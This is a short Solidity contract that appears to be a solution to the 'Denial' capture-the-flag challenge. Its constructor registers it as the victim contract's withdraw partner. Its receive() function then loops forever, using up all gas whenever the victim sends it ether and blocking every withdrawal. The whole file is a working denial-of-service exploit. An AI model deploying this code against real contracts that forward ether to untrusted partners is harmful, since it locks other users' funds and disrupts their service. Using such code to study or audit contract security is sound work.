// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

interface IDenial {
    function setWithdrawPartner(address _partner) external;
}

contract Denial {
    constructor(address _instanceAddress) {
        IDenial(_instanceAddress).setWithdrawPartner(address(this));
    }

    receive() external payable {
        while (true) {}
    }
}
